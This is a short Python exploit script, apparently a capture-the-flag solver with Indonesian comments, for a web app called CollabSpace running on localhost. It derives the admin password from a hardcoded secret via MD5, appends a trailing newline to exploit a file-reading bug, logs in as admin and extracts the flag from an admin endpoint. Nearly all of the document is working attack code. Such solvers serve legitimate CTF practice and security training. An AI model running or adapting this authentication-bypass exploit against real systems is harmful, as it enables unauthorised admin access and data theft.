#!/usr/bin/env python3
import requests
import hashlib

BASE_URL = "http://localhost:1337"
SECRET = "makanberas"

def exploit():
    print("[*] Starting CollabSpace Local Bypass Solver...")
    session = requests.Session()
    
    # 1. Kalkulasi password admin berdasarkan algoritma entrypoint
    raw_str = f"{SECRET}_admin".encode()
    admin_pass_hash = hashlib.md5(raw_str).hexdigest()
    
    # 2. Eksploitasi Trailing Newline Bug
    # fs.readFileSync membaca file beserta \n bawaan perintah 'echo' di bash
    admin_password = f"{admin_pass_hash}\n"
    
    print(f"[*] Computed Admin Password: {admin_pass_hash} (with trailing newline)")
    
    # 3. Login sebagai admin
    print("[*] 1. Logging in as 'admin'...")
    res = session.post(
        f"{BASE_URL}/api/login", 
        json={"username": "admin", "password": admin_password}
    )
    
    if not res.ok:
        print("[-] Login gagal! Cek kembali status container.")
        return
    print("[+] Login berhasil! Dapet session cookie admin.")
    
    # 4. Tarik Flag
    print("[*] 2. Accessing /api/admin/secret...")
    res_secret = session.get(f"{BASE_URL}/api/admin/secret")
    
    if res_secret.status_code == 200:
        secret_data = res_secret.json()
        print("\n========================================")
        print("[+] PWNED! Flag Extracted:")
        # Kita strip() biar \n di belakang flagnya ilang pas di-print
        print(secret_data.get('secret', '').strip())
        print("========================================\n")
    else:
        print("[-] Gagal mengekstrak flag.")

if __name__ == "__main__":
    exploit()
